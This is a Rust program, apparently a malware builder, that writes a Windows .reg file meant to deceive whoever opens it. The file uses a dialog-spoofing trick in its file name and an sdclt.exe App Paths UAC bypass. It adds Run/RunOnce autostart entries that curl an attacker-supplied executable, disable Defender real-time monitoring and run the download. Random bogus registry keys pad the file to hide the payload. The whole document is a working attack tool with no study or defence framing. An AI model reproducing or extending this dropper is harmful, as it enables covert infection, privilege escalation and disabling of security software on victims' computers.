use rand::{distributions::Alphanumeric, Rng};
use std::{io::Write, vec};

fn main() {
    let args = std::env::args().collect::<Vec<_>>();

    if args.len() < 2 {
        println!(
            "Usage: {} <direct_link> <output> </dialog_spoof_msg> </trashcode>",
            args[0]
        );
        return;
    }

    let direct_link = &args[1];
    let output = &args[2];

    let mut dialog_spoof_msg = "";
    let mut trashcode: bool = true;

    if args.len() == 4 {
        dialog_spoof_msg = &args[3];
    }
    if args.len() == 5 {
        dialog_spoof_msg = &args[3];
        trashcode = args[4].parse::<bool>().unwrap();
    }

    let mut filename = output.to_string();

    if !dialog_spoof_msg.is_empty() {
        println!("> Dialog spoof message: {}", dialog_spoof_msg);
        filename.push_str(format!("%n%n{}%n%0", dialog_spoof_msg).as_str());
    }

    filename.push_str(".reg");

    let mut data = vec![];

    let random_name= rand::thread_rng().sample_iter(&Alphanumeric).take(8).map(char::from).collect::<String>();
    let random_name2 = rand::thread_rng().sample_iter(&Alphanumeric).take(8).map(char::from).collect::<String>();

    data.push("");

    // uac bypass
    data.push(
        "[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\sdclt.exe]",
    ); // registry key
    data.push("\"Path\"=\"C:\\\\Users\\\\Public\\\\Videos\\\\\""); // registry value
    let path_uac = format!("@=\"c:\\\\Users\\\\public\\\\{random_name}.bat\"");
    data.push(path_uac.as_str()); // registry value
    data.push("");

    // autostart
    data.push("[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]"); // registry key


    let mut written_cmd = vec![];
    written_cmd.push(format!(
        "echo @echo off"
    ));
    written_cmd.push(format!("curl {} -o %temp%\\\\calc.exe", direct_link));
    written_cmd.push(format!("powershell Set-MpPreference -DisableRealtimeMonitoring $true"));
    written_cmd.push(format!("%temp%\\\\calc.exe"));


    let mut output  = "cmd /c \\\"(".to_string();
    let mut i = 0;
    for string in written_cmd.iter() {
        if i > 0 {
            output.push_str(" & ");
        }
        output.push_str(format!("echo {}", string).as_str());
        i+=1;
    }

    output.push_str(format!(")\\\" > %temp%\\\\{random_name}.bat").as_str());
    


    let formatted_string = format!("\"{random_name}\"=\"{}\"", output);
    data.push(formatted_string.as_str());
    let formatted_string2 = format!("\"{random_name2}\"=\"cmd /c echo start /min cmd /c %temp%\\\\{random_name}.bat >> c:\\\\Users\\\\public\\\\{random_name}.bat\"");
    data.push(formatted_string2.as_str());
    data.push("");

    //triggercmd: sdclt.exe

    //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce

    data.push("[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce]");
    let uac_trigger = format!("\"{random_name}\"=\"{path_uac}\"");
    data.push(uac_trigger.as_str()); // trigger uac bypass
    data.push("");


    // done basically

    //trashcode


    let mut bogus: Vec<String> = vec![];

    if trashcode {
        
        // write bogus keys into data
        let mut bogus_keys = vec![];
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Interface\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\TypeLib\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AppID\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Wow6432Node\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Wow6432Node\\CLSID\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Wow6432Node\\Interface\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Wow6432Node\\TypeLib\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Wow6432Node\\AppID\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\\");
        bogus_keys.push("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden\\SHOWALL\\");


      

      
        for _ in 0..150 {
            bogus.push(format!(
                "[{}\\{random}]",
                bogus_keys[rand::thread_rng().gen_range(0..bogus_keys.len())],
                random=rand::thread_rng().sample_iter(&Alphanumeric).take(10).map(char::from).collect::<String>()
            ).to_string());

            bogus.push(format!(
                "\"{}\"=\"{}\"",
                rand::thread_rng().sample_iter(&Alphanumeric).take(10).map(char::from).collect::<String>(),
                rand::thread_rng().sample_iter(&Alphanumeric).take(10).map(char::from).collect::<String>()
            ).to_string());

            bogus.push("\r\n".to_string());
        }
    }
    
        
    
    let mut file = std::fs::File::options().write(true).truncate(true).create(true).open(filename).unwrap();



    writeln!(file, "Windows Registry Editor Version 5.00").unwrap();
    for i in 0..bogus.len() {
        file.write_all(b"\r\n").unwrap();
        file.write_all(bogus[i].as_bytes()).unwrap();
    }

    //write data into file
    file.write_all(data.join("\r\n").as_bytes()).unwrap();

    //write bogus data into file
    for i in 0..bogus.len() {
        file.write_all(b"\r\n").unwrap();
        file.write_all(bogus[i].as_bytes()).unwrap();
    }


}

